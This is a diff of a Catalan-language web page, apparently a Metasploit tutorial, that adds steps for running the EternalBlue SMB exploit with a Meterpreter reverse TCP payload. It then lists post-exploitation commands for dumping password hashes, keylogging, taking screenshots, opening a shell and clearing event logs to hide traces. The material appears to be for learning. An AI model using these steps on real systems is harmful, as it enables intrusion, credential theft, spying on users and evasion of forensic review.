@@ -93,12 +93,37 @@
 </ul>
 <p><code>use exploit/windows/smb/ms17_010_eternalblue</code>...i ens torna el control mitjançant un <strong>shell o un Meterpreter</strong> (Metainterprete:payload que permet carregar i injectar en un programa del sistema atacat les extensions que em desenvolupat en format .dll). </p>
 <ul>
-<li>i payload <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></li>
+<li>
+<p>i payload <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code></p>
+</li>
+<li>
+<p>i executem <code>exploit</code></p>
+</li>
 </ul>
 <p>Ja estem dins...</p>
 <ul>
-<li>Comandaments:</li>
+<li>Comandaments que podem fer servir:</li>
+<li>De sitema:<ul>
+<li>sysinfo</li>
+<li>getuid</li>
+<li>migrate <code>pid</code></li>
+<li>hashdump</li>
+<li>upload/download</li>
+<li>shell</li>
+<li>sysinfo</li>
 </ul>
+</li>
+<li>De Espionatge<ul>
+<li>keyscan_start/keyscan_dump</li>
+<li>screenshot/screenstreamer</li>
+</ul>
+</li>
+<li>Per a no deixar Rastre<ul>
+<li>clearev</li>
+</ul>
+</li>
+</ul>
+<p>Per supossat hi han prou més... convide a l'usuari a investigar-los, només heu de ficar dins de l'exploit: <code>help</code></p>
               
             </div>
           </div><footer>
